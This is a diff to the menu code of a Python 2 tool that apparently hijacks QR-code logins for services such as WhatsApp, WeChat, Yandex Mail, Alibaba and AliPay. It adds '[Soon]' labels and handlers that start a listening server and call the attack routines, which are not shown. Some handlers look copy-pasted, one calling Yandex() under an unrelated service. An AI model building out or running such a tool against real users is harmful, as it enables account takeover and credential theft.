@@ -382,7 +382,7 @@ def main():
 		print """
  1.WhatsApp
  2.WeChat
- 3.Line
+ 3.Line     [Soon]
  4.Weibo
  5.QQ Instant Messaging
  00.Back To Main Menu
@@ -455,7 +455,7 @@ def main():
 	#Mailing Services
 	if choice == 2:
 		print """
- 1.QQ Mail
+ 1.QQ Mail [Soon]
  2.Yandex Mail
  00.Back To Main Menu
 	"""
@@ -463,6 +463,8 @@ def main():
 
 		if choice_2 == "00":
 			main()
+
+		#1
 
 		elif int(choice_2) == 2:
 			port = raw_input(" Port to listen on (Default 1337) : ")
@@ -485,9 +487,9 @@ def main():
  1.Alibaba
  2.Aliexpress
  3.Taobao
- 4.Tmall
- 5.1688.com
- 6.Alimama
+ 4.Tmall [Soon]
+ 5.1688.com [Soon]
+ 6.Alimama [Soon]
  7.Taobao Trips
  00.Back To Main Menu
 	"""
@@ -534,14 +536,30 @@ def main():
 	#Online Banking
 	if choice == 4:
 		print """
- 1.AliPay
+ 1.AliPay [Soon]
  2.Yandex Money
- 3.TenPay
+ 3.TenPay [Soon]
  00.Back To Main Menu
 	"""
 		choice_2 = raw_input(" Second Choice > ")
 		if choice_2 == "00":
 			main()
+
+		elif int(choice_2) == 2:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			Yandex()
+			main()
+	#Mobile Managem
 
 	#Passport Services
 	if choice == 5:
@@ -553,6 +571,20 @@ def main():
 		if choice_2 == "00":
 			main()
 
+		elif int(choice_2) == 1:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			Yandex()
+			main()
 	#Mobile Management Software
 	if choice == 6:
 		print """
@@ -583,11 +615,11 @@ def main():
 	if choice == 7:
 		print """
  1.MyDigiPass
- 2.Zapper
- 3.Trustly App
- 4.Yelophone
- 5.Alibaba Yunos
- 00.Back To Main Menu
+ 2.Zapper [Soon]
+ 3.Trustly App [Soon]
+ 4.Yelophone [Soon]
+ 5.Alibaba Yunos [Soon]
+ 00.Back To Main Menu [Soon]
 """
 		choice_2 = raw_input(" Second Choice > ")
 		if choice_2 == "00":
